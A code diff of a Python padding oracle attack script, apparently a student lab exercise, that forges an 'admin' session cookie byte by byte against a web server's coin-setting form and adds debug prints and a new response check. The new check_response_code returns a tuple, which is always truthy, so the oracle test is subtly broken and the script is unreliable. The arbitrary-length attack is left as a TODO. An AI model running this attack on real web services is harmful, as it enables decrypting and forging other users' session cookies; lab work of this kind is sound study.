@@ -62,7 +62,7 @@ def po_attack_2blocks(po, ctx):
         for val in range(256):
             test[i] = val
             if check_padding_response(str(test).encode('utf-8')):
-                print("Padding passed")
+                # print("Padding passed")
                 plaintext[i] = val ^ c0[i] ^ (16 - i)
     return plaintext
 
@@ -75,6 +75,12 @@ def po_attack(po, ctx):
     ctx_blocks = list(split_into_blocks(ctx, po.block_length)) # TODO: Is this block length correct for the hex string?
     nblocks = len(ctx_blocks)
     # TODO: Implement padding oracle attack for arbitrary length message.
+
+def check_response_code(response):
+    """
+    Given a response object, check its status code
+    """
+    return response.status_code == codes.ok, response
 
 def is_response_ok(response):
     """
@@ -92,10 +98,15 @@ def check_padding_response(cookie):
     """
     sess.cookies.set("admin", None)
     sess.cookies.set("admin", cookie.hex())
-    #print("Cookies after maul: {}".format(sess.cookies.get_dict()))
+    print("Cookies after maul: {}".format(sess.cookies.get_dict()))
     result, response = do_setcoins_form(sess, uname, 5000)
+    if result == False:
+        print("result false")
+    # print("Result status code: {}".format(result))
     
-    return is_response_ok(response)
+    # return is_response_ok(response)
+    # TODO: Changed webserver to return 400 code when padding failed
+    return check_response_code(response)
 
 if __name__ == "__main__":
     print("Running Padding Oracle Attack")
